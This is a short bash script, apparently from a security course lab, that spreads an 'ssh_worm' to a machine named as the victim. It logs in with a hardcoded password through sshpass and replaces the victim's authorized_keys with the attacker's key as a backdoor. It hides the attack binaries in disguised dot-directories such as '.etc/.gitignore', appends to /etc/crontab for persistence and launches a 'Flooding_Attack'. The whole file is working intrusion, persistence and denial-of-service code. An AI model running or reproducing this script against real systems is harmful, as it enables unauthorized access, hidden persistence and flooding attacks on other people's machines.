# task3
# input victim's IP address
export SSHPASS='victim'

read -p "Enter Victim IP Address: " IP_Address
read -p "First?(y/n) " First

sshpass -e scp -r /home/cs2019/Desktop/ssh_worm victim@"$IP_Address":/home/victim/Desktop

# publickey
SSH_PATH="/home/victim/.ssh"

#if [ "$First" = "y" ];
#then
#	(
#	echo "\r"
#	sleep 1
#	echo "\r"
#	sleep 1
#	echo "\r"
#	sleep 1
#	echo "yes\r"
#	)|ssh-keygen
#else 
#	(
#	echo "\r"
#	sleep 1
#	echo "n\r"
#	sleep 1
#	)|
#fi
ssh-keygen
# sshpass -e scp /root/.ssh/id_rsa.pub victim@"$IP_Address":/home/victim/.ssh/
#(echo "victim\r")|
sshpass -e scp /home/cs2019/.ssh/id_rsa.pub victim@"$IP_Address":/home/victim/.ssh/authorized_keys
#####
echo "qq1"
ssh victim@"$IP_Address" 'Hidden1="/home/victim/.etc/.gitignore"; mkdir -p $Hidden1; chmod 777 $Hidden1; cp /home/victim/Desktop/ssh_worm/Infect/Flooding_Attack $Hidden1; cp /home/victim/Desktop/ssh_worm/Infect/Check_Attack $Hidden1; cp /home/victim/Desktop/ssh_worm/Infect/Launching_Attack $Hidden1 > /dev/null 2>&1'
echo "qq2"
ssh victim@"$IP_Address" 'Hidden2="/home/victim/.Launch_Attack"; mkdir -p $Hidden2; chmod 777 $Hidden2; cp /home/victim/Desktop/ssh_worm/Infect/Flooding_Attack $Hidden2; cp /home/victim/Desktop/ssh_worm/Infect/Check_Attack $Hidden2; cp /home/victim/Desktop/ssh_worm/Infect/Launching_Attack $Hidden2 > /dev/null 2>&1'
echo "qq3"
ssh -t victim@"$IP_Address" 'Hidden2="/home/victim/.Launch_Attack"; (sudo chmod +w /etc/crontab) && (sudo sh -c "cat /home/victim/Desktop/ssh_worm/crontab.txt >> /etc/crontab"); cd "$Hidden2" && ./Flooding_Attack > /dev/null 2>&1'
echo "qq4"